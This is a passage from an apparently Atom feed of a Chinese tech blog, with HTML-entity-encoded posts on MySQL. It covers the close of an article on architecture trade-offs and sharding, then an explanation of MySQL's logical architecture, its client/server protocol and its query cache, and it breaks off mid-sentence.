84;&#x7F18;&#x6545;&#xFF1F;&#x70B9;&#x592A;&#x5C11;&#xFF0C;&#x81EA;&#x7136;&#x4E0D;&#x80FD;&#x8FDE;&#x63A5;&#x6210;&#x7EBF;&#xFF0C;&#x7EBF;&#x592A;&#x5C11;&#xFF0C;&#x81EA;&#x7136;&#x4E0D;&#x80FD;&#x7ED3;&#x6210;&#x7F51;</strong>&#x3002;&#x56E0;&#x800C;&#xFF0C;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x529E;&#x6CD5;&#xFF0C;<strong>&#x4FDD;&#x6301;&#x597D;&#x5947;&#x5FC3;&#x3001;&#x591A;&#x5B66;&#x4E60;&#x3001;&#x591A;&#x79EF;&#x7D2F;&#xFF0C;&#x91CF;&#x53D8;&#x603B;&#x6709;&#x4E00;&#x5929;&#x4F1A;&#x8D28;&#x53D8;</strong>&#x3002;</p><p>&#x524D;&#x9762;&#x6211;&#x5199;&#x7684;&#x4E00;&#x4E9B;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x4F1A;&#x6709;&#x63D0;&#x5230;&#x8FC7;&#xFF0C;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x662F;&#x4E00;&#x79CD;&#x5E73;&#x8861;&#x7684;&#x827A;&#x672F;&#xFF0C;&#x5176;&#x5B9E;&#x8D28;&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x79CD;&#x59A5;&#x534F;&#xFF0C;&#x662F;&#x5BF9;&#x73B0;&#x6709;&#x8D44;&#x6E90;&#x7684;&#x4E00;&#x79CD;&#x59A5;&#x534F;&#x3002;&#x6709;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x4F1A;&#x4E0D;&#x81EA;&#x89C9;&#x7684;&#x9677;&#x5165;&#x67D0;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x4E3A;&#x4E86;&#x8FFD;&#x6C42;&#x6570;&#x636E;&#x7684;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x5F88;&#x591A;&#x4EBA;&#x4E00;&#x4E0A;&#x6765;&#x5C31;&#x5F00;&#x59CB;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x5E94;&#x7528;&#x641E;&#x5F97;&#x975E;&#x5E38;&#x590D;&#x6742;&#xFF0C;&#x5230;&#x6700;&#x540E;&#x8868;&#x91CC;&#x8FD8;&#x6CA1;&#x6709;&#x88C5;&#x6EE1;&#x6570;&#x636E;&#xFF0C;&#x9879;&#x76EE;&#x5C31;&#x5DF2;&#x7ECF;&#x6B7B;&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x5728;&#x8D44;&#x6E90;&#x6709;&#x9650;&#x6216;&#x8005;&#x672A;&#x6765;&#x8FD8;&#x4E0D;&#x53EF;&#x77E5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x3001;&#x8BED;&#x8A00;&#x672C;&#x8EAB;&#x7684;&#x7279;&#x6027;&#x6765;&#x5B8C;&#x6210;&#x76F8;&#x5E94;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x4F1A;&#x66F4;&#x597D;&#x4E00;&#x70B9;&#x3002;&#x89E3;&#x51B3;&#x5927;&#x6570;&#x636E;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x4E0D;&#x53EA;&#x662F;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF0C;&#x4F60;&#x8FD8;&#x5E94;&#x8BE5;&#x8FD8;&#x53EF;&#x4EE5;&#x60F3;&#x5230;&#x5206;&#x533A;&#xFF1B;&#x6709;&#x4E9B;&#x4E1A;&#x52A1;&#x5373;&#x4F7F;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x73AF;&#x5883;&#x4E0B;&#x4E5F;&#x4E0D;&#x4E00;&#x5B9A;&#x975E;&#x8981;&#x5728;&#x4E1A;&#x52A1;&#x5C42;&#x5B8C;&#x6210;&#xFF0C;&#x5408;&#x7406;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x6216;&#x8005;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x6839;&#x636E;&#x5206;&#x8868;&#x5206;&#x5E93;&#x89C4;&#x5219;&#x7684;&#x5C0F;&#x5DE5;&#x5177;&#x4E5F;&#x8BB8;&#x4F1A;&#x8BA9;&#x4F60;&#x66F4;&#x8F7B;&#x677E;&#x2026;&#x2026;</p><h2 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;" class="headerlink" title="&#x53C2;&#x8003;&#x8D44;&#x6599;"></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h2><p>&#x9AD8;&#x6027;&#x80FD; MySQL(&#x7B2C; 3 &#x7248;)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;img.jpg&quot; class=&quot;full-image&quot; alt=&quot;al
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(一)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/</id>
    <published>2019-03-29T06:57:21.000Z</published>
    <updated>2019-03-29T07:42:23.911Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>&#x626B;&#x5730;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x6211;di&#x8868;&#x9762;&#x5DE5;&#x4F5C;&#xFF0C;&#x6211;&#x771F;&#x6B63;di&#x8EAB;&#x4EFD;&#x662F;&#x4E00;&#x4F4D;&#x7814;&#x7A76;&#x2014;&#x2014;&#x50E7;&#x3002;</strong></p></blockquote><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x8BF4;&#x8D77; MySQL &#x7684;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#xFF0C;&#x76F8;&#x4FE1;&#x5927;&#x5BB6;&#x6536;&#x85CF;&#x4E86;&#x4E00;&#x5806;&#x5947;&#x6280;&#x6DEB;&#x5DE7;&#xFF1A;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;SELECT *&#x3001;&#x4E0D;&#x4F7F;&#x7528; NULL &#x5B57;&#x6BB5;&#x3001;&#x5408;&#x7406;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x3001;&#x4E3A;&#x5B57;&#x6BB5;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x2026;&#x2026; &#x4F60;&#x662F;&#x5426;&#x771F;&#x7684;&#x7406;&#x89E3;&#x8FD9;&#x4E9B;&#x4F18;&#x5316;&#x6280;&#x5DE7;&#xFF1F;&#x662F;&#x5426;&#x7406;&#x89E3;&#x5176;&#x80CC;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF1F;&#x5728;&#x5B9E;&#x9645;&#x573A;&#x666F;&#x4E0B;&#x6027;&#x80FD;&#x771F;&#x6709;&#x63D0;&#x5347;&#x5417;&#xFF1F;&#x6211;&#x60F3;&#x672A;&#x5FC5;&#x3002;&#x56E0;&#x800C;&#x7406;&#x89E3;&#x8FD9;&#x4E9B;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;&#x80CC;&#x540E;&#x7684;&#x539F;&#x7406;&#x5C31;&#x5C24;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x5E0C;&#x671B;&#x672C;&#x6587;&#x80FD;&#x8BA9;&#x4F60;&#x91CD;&#x65B0;&#x5BA1;&#x89C6;&#x8FD9;&#x4E9B;&#x4F18;&#x5316;&#x5EFA;&#x8BAE;&#xFF0C;&#x5E76;&#x5728;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x4E0B;&#x5408;&#x7406;&#x7684;&#x8FD0;&#x7528;&#x3002;</p><h4 id="MySQL-&#x903B;&#x8F91;&#x67B6;&#x6784;"><a href="#MySQL-&#x903B;&#x8F91;&#x67B6;&#x6784;" class="headerlink" title="MySQL &#x903B;&#x8F91;&#x67B6;&#x6784;"></a>MySQL &#x903B;&#x8F91;&#x67B6;&#x6784;</h4><p>&#x5982;&#x679C;&#x80FD;&#x5728;&#x5934;&#x8111;&#x4E2D;&#x6784;&#x5EFA;&#x4E00;&#x5E45; MySQL &#x5404;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x5982;&#x4F55;&#x534F;&#x540C;&#x5DE5;&#x4F5C;&#x7684;&#x67B6;&#x6784;&#x56FE;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x6DF1;&#x5165;&#x7406;&#x89E3; MySQL &#x670D;&#x52A1;&#x5668;&#x3002;&#x4E0B;&#x56FE;&#x5C55;&#x793A;&#x4E86; MySQL &#x7684;&#x903B;&#x8F91;&#x67B6;&#x6784;&#x56FE;&#x3002;<br><span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="img.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span></p><p>MySQL &#x903B;&#x8F91;&#x67B6;&#x6784;&#x6574;&#x4F53;&#x5206;&#x4E3A;&#x4E09;&#x5C42;&#xFF0C;&#x6700;&#x4E0A;&#x5C42;&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x5C42;&#xFF0C;&#x5E76;&#x975E; MySQL &#x6240;&#x72EC;&#x6709;&#xFF0C;&#x8BF8;&#x5982;&#xFF1A;&#x8FDE;&#x63A5;&#x5904;&#x7406;&#x3001;&#x6388;&#x6743;&#x8BA4;&#x8BC1;&#x3001;&#x5B89;&#x5168;&#x7B49;&#x529F;&#x80FD;&#x5747;&#x5728;&#x8FD9;&#x4E00;&#x5C42;&#x5904;&#x7406;&#x3002;</p><p>MySQL &#x5927;&#x591A;&#x6570;&#x6838;&#x5FC3;&#x670D;&#x52A1;&#x5747;&#x5728;&#x4E2D;&#x95F4;&#x8FD9;&#x4E00;&#x5C42;&#xFF0C;&#x5305;&#x62EC;&#x67E5;&#x8BE2;&#x89E3;&#x6790;&#x3001;&#x5206;&#x6790;&#x3001;&#x4F18;&#x5316;&#x3001;&#x7F13;&#x5B58;&#x3001;&#x5185;&#x7F6E;&#x51FD;&#x6570; (&#x6BD4;&#x5982;&#xFF1A;&#x65F6;&#x95F4;&#x3001;&#x6570;&#x5B66;&#x3001;&#x52A0;&#x5BC6;&#x7B49;&#x51FD;&#x6570;)&#x3002;&#x6240;&#x6709;&#x7684;&#x8DE8;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684;&#x529F;&#x80FD;&#x4E5F;&#x5728;&#x8FD9;&#x4E00;&#x5C42;&#x5B9E;&#x73B0;&#xFF1A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3001;&#x89E6;&#x53D1;&#x5668;&#x3001;&#x89C6;&#x56FE;&#x7B49;&#x3002;</p><p>&#x6700;&#x4E0B;&#x5C42;&#x4E3A;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x5176;&#x8D1F;&#x8D23; MySQL &#x4E2D;&#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x548C;&#x63D0;&#x53D6;&#x3002;&#x548C; Linux &#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7C7B;&#x4F3C;&#xFF0C;&#x6BCF;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x90FD;&#x6709;&#x5176;&#x4F18;&#x52BF;&#x548C;&#x52A3;&#x52BF;&#x3002;&#x4E2D;&#x95F4;&#x7684;&#x670D;&#x52A1;&#x5C42;&#x901A;&#x8FC7; API &#x4E0E;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x901A;&#x4FE1;&#xFF0C;&#x8FD9;&#x4E9B; API &#x63A5;&#x53E3;&#x5C4F;&#x853D;&#x4E86;&#x4E0D;&#x540C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x3002;</p><h4 id="MySQL-&#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;"><a href="#MySQL-&#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;" class="headerlink" title="MySQL &#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;"></a>MySQL &#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;</h4><p>&#x6211;&#x4EEC;&#x603B;&#x662F;&#x5E0C;&#x671B; MySQL &#x80FD;&#x591F;&#x83B7;&#x5F97;&#x66F4;&#x9AD8;&#x7684;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x529E;&#x6CD5;&#x662F;&#x5F04;&#x6E05;&#x695A; MySQL &#x662F;&#x5982;&#x4F55;&#x4F18;&#x5316;&#x548C;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x7684;&#x3002;&#x4E00;&#x65E6;&#x7406;&#x89E3;&#x4E86;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#xFF1A;<strong>&#x5F88;&#x591A;&#x7684;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x5DE5;&#x4F5C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x9075;&#x5FAA;&#x4E00;&#x4E9B;&#x539F;&#x5219;&#x8BA9; MySQL &#x7684;&#x4F18;&#x5316;&#x5668;&#x80FD;&#x591F;&#x6309;&#x7167;&#x9884;&#x60F3;&#x7684;&#x5408;&#x7406;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x800C;&#x5DF2;</strong>&#x3002;</p><p>&#x5F53;&#x5411; MySQL &#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;MySQL &#x5230;&#x5E95;&#x505A;&#x4E86;&#x4E9B;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;<br><img src="/2019/03/29/mysql-optimization-principle-1/SQLluoji.jpg" title="SQLluoji"></p><h4 id="&#x5BA2;&#x6237;&#x7AEF;-&#x670D;&#x52A1;&#x7AEF;&#x901A;&#x4FE1;&#x534F;&#x8BAE;"><a href="#&#x5BA2;&#x6237;&#x7AEF;-&#x670D;&#x52A1;&#x7AEF;&#x901A;&#x4FE1;&#x534F;&#x8BAE;" class="headerlink" title="&#x5BA2;&#x6237;&#x7AEF; / &#x670D;&#x52A1;&#x7AEF;&#x901A;&#x4FE1;&#x534F;&#x8BAE;"></a>&#x5BA2;&#x6237;&#x7AEF; / &#x670D;&#x52A1;&#x7AEF;&#x901A;&#x4FE1;&#x534F;&#x8BAE;</h4><p>MySQL &#x5BA2;&#x6237;&#x7AEF; / &#x670D;&#x52A1;&#x7AEF;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x662F; &#x201C;&#x534A;&#x53CC;&#x5DE5;&#x201D; &#x7684;&#xFF1A;&#x5728;&#x4EFB;&#x4E00;&#x65F6;&#x523B;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x52A8;&#x4F5C;&#x4E0D;&#x80FD;&#x540C;&#x65F6;&#x53D1;&#x751F;&#x3002;&#x4E00;&#x65E6;&#x4E00;&#x7AEF;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6D88;&#x606F;&#xFF0C;&#x53E6;&#x4E00;&#x7AEF;&#x8981;&#x63A5;&#x6536;&#x5B8C;&#x6574;&#x4E2A;&#x6D88;&#x606F;&#x624D;&#x80FD;&#x54CD;&#x5E94;&#x5B83;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x4E5F;&#x65E0;&#x987B;&#x5C06;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x5207;&#x6210;&#x5C0F;&#x5757;&#x72EC;&#x7ACB;&#x53D1;&#x9001;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#x3002;</p><p>&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x6570;&#x636E;&#x5305;&#x5C06;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5F88;&#x957F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;<code>max_allowed_packet</code>&#x53C2;&#x6570;&#x3002;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x5B9E;&#x5728;&#x662F;&#x592A;&#x5927;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x4F1A;&#x62D2;&#x7EDD;&#x63A5;&#x6536;&#x66F4;&#x591A;&#x6570;&#x636E;&#x5E76;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p><p>&#x4E0E;&#x4E4B;&#x76F8;&#x53CD;&#x7684;&#x662F;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x7ED9;&#x7528;&#x6237;&#x7684;&#x6570;&#x636E;&#x901A;&#x5E38;&#x4F1A;&#x5F88;&#x591A;&#xFF0C;&#x7531;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7EC4;&#x6210;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x987B;&#x5B8C;&#x6574;&#x7684;&#x63A5;&#x6536;&#x6574;&#x4E2A;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x7B80;&#x5355;&#x7684;&#x53EA;&#x53D6;&#x524D;&#x9762;&#x51E0;&#x6761;&#x7ED3;&#x679C;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x670D;&#x52A1;&#x5668;&#x505C;&#x6B62;&#x53D1;&#x9001;&#x3002;&#x56E0;&#x800C;&#x5728;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#xFF0C;&#x5C3D;&#x91CF;&#x4FDD;&#x6301;&#x67E5;&#x8BE2;&#x7B80;&#x5355;&#x4E14;&#x53EA;&#x8FD4;&#x56DE;&#x5FC5;&#x9700;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x51CF;&#x5C0F;&#x901A;&#x4FE1;&#x95F4;&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#x548C;&#x6570;&#x91CF;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7684;&#x4E60;&#x60EF;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x67E5;&#x8BE2;&#x4E2D;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;<code>SELECT *</code>&#x4EE5;&#x53CA;&#x52A0;&#x4E0A;<code>LIMIT</code>&#x9650;&#x5236;&#x7684;&#x539F;&#x56E0;&#x4E4B;&#x4E00;&#x3002;</p><h4 id="&#x67E5;&#x8BE2;&#x7F13;&#x5B58;"><a href="#&#x67E5;&#x8BE2;&#x7F13;&#x5B58;" class="headerlink" title="&#x67E5;&#x8BE2;&#x7F13;&#x5B58;"></a>&#x67E5;&#x8BE2;&#x7F13;&#x5B58;</h4><p>&#x5728;&#x89E3;&#x6790;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x524D;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x662F;&#x6253;&#x5F00;&#x7684;&#xFF0C;&#x90A3;&#x4E48; MySQL &#x4F1A;&#x68C0;&#x67E5;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x662F;&#x5426;&#x547D;&#x4E2D;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x3002;&#x5982;&#x679C;&#x5F53;&#x524D;&#x67E5;&#x8BE2;&#x6070;&#x597D;&#x547D;&#x4E2D;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x5728;&#x68C0;&#x67E5;&#x4E00;&#x6B21;&#x7528;&#x6237;&#x6743;&#x9650;&#x540E;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x67E5;&#x8BE2;&#x4E0D;&#x4F1A;&#x88AB;&#x89E3;&#x6790;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x751F;&#x6210;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x66F4;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x3002;</p><p>MySQL &#x5C06;&#x7F13;&#x5B58;&#x5B58;&#x653E;&#x5728;&#x4E00;&#x4E2A;&#x5F15;&#x7528;&#x8868;&#xFF08;&#x4E0D;&#x8981;&#x7406;&#x89E3;&#x6210;<code>table</code>&#xFF0C;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F;&#x7C7B;&#x4F3C;&#x4E8E;<code>HashMap</code>&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF09;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x54C8;&#x5E0C;&#x503C;&#x7D22;&#x5F15;&#xFF0C;&#x8FD9;&#x4E2A;&#x54C8;&#x5E0C;&#x503C;&#x901A;&#x8FC7;&#x67E5;&#x8BE2;&#x672C;&#x8EAB;&#x3001;&#x5F53;&#x524D;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x53F7;&#x7B49;&#x4E00;&#x4E9B;&#x53EF;&#x80FD;&#x5F71;&#x54CD;&#x7ED3;&#x679C;&#x7684;&#x4FE1;&#x606F;&#x8BA1;&#x7B97;&#x5F97;&#x6765;&#x3002;&#x6240;&#x4EE5;&#x4E24;&#x4E2A;&#x67E5;&#x8BE2;&#x5728;&#x4EFB;&#x4F55;&#x5B57;&#x7B26;&#x4E0A;&#x7684;&#x4E0D;&#x540C;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;&#x7A7A;&#x683C;&#x3001;&#x6CE8;&#x91CA;&#xFF09;&#xFF0C;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;&#x7F13;&#x5B58;&#x4E0D;&#x4F1A;&#x547D;&#x4E2D;&#x3002;</p><p>&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x4E2D;&#x5305;&#x542B;&#x4EFB;&#x4F55;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x3001;&#x5B58;&#x50A8;&#x51FD;&#x6570;&#x3001;&#x7528;&#x6237;&#x53D8;&#x91CF;&#x3001;&#x4E34;&#x65F6;&#x8868;&#x3001;MySQL &#x5E93;&#x4E2D;&#x7684;&#x7CFB;&#x7EDF;&#x8868;&#xFF0C;&#x5176;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x90FD;&#x4E0D;&#x4F1A;&#x88AB;&#x7F13;&#x5B58;&#x3002;&#x6BD4;&#x5982;&#x51FD;&#x6570;<code>NOW()</code>&#x6216;&#x8005;<code>CURRENT_DATE()</code>&#x4F1A;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x65F6;&#x95F4;&#xFF0C;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#xFF0C;&#x518D;&#x6BD4;&#x5982;&#x5305;&#x542B;<code>CURRENT_USER</code>&#x6216;&#x8005;<code>CONNECION_ID()</code>&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x4F1A;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x7684;&#x7528;&#x6237;&#x800C;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x5C06;&#x8FD9;&#x6837;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x7F13;&#x5B58;&#x8D77;&#x6765;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x610F;&#x4E49;&#x3002;</p><p>&#x65E2;&#x7136;&#x662F;&#x7F13;&#x5B58;&#xFF0C;&#x5C31;&#x4F1A;&#x5931;&#x6548;&#xFF0C;&#x90A3;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x4F55;&#x65F6;&#x5931;&#x6548;&#x5462;&#xFF1F;MySQL &#x7684;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#x4F1A;&#x8DDF;&#x8E2A;&#x67E5;&#x8BE2;&#x4E2D;&#x6D89;&#x53CA;&#x7684;&#x6BCF;&#x4E2A;&#x8868;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E9B;&#x8868;&#xFF08;&#x6570;&#x636E;&#x6216;&#x7ED3;&#x6784;&#xFF09;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x90A3;&#x4E48;&#x548C;&#x8FD9;&#x5F20;&#x8868;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x90FD;&#x5C06;&#x5931;&#x6548;&#x3002;&#x6B63;&#x56E0;&#x4E3A;&#x5982;&#x6B64;&#xFF0C;&#x5728;&#x4EFB;&#x4F55;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;MySQL &#x5FC5;&#x987B;&#x5C06;&#x5BF9;&#x5E94;&#x8868;&#x7684;&#x6240;&#x6709;&#x7F13;&#x5B58;&#x90FD;&#x8BBE;&#x7F6E;&#x4E3A;&#x5931;&#x6548;&#x3002;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x975E;&#x5E38;&#x5927;&#x6216;&#x8005;&#x788E;&#x7247;&#x5F88;&#x591A;&#xFF0C;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x5C31;&#x53EF;&#x80FD;&#x5E26;&#x6765;&#x5F88;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x6D88;&#x8017;&#xFF0C;&#x751A;&#x81F3;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x50F5;&#x6B7B;&#x4E00;&#x4F1A;&#x513F;&#x3002;&#x800C;&#x4E14;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x5BF9;&#x7CFB;&#x7EDF;&#x7684;&#x989D;&#x5916;&#x6D88;&#x8017;&#x4E5F;&#x4E0D;&#x4EC5;&#x4EC5;&#x5728;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x8BFB;&#x64CD;&#x4F5C;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF1A;</p><ul><li>&#x4EFB;&#x4F55;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5728;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x90FD;&#x5FC5;&#x987B;&#x7ECF;&#x8FC7;&#x68C0;&#x67E5;&#xFF0C;&#x5373;&#x4F7F;&#x8FD9;&#x6761; SQL 